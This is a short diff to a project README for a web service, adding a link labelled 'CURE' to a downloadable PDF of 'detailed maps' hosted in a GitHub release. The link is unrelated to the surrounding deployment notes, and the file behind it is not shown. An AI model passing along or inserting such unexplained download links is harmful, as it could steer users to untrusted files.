@@ -88,3 +88,5 @@ Features:
 * Docker-ready later if needed
 
 This can be deployed on Render's free/low-cost plan as a single Web Service without any issues.
+
+[CURE](https://github.com/sanjeetkumaritoutlook/angular22-nestjs-monorepo/releases/download/v1.0.0-cure/972504900-All-Zones-Detailed-Maps.pdf)
